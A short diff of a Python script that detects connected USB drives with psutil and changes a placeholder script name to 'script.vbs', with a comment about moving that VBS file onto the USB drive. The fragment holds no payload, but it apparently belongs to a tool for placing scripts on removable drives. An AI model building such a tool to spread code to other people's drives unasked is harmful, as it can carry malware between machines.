@@ -2,8 +2,8 @@ import os
 import time
 import psutil
 
-#!!!!!Change the name of the script!!!!!
-urscript = 'urscript.extrntion' 
+#!!!!!Change the name of the script like a Visual basic Script OR move the "script.vbs" to usb!!!!!
+urscript = 'script.vbs' 
 
 def get_usb_drives():
     """Returns a set of currently connected USB storage drives."""
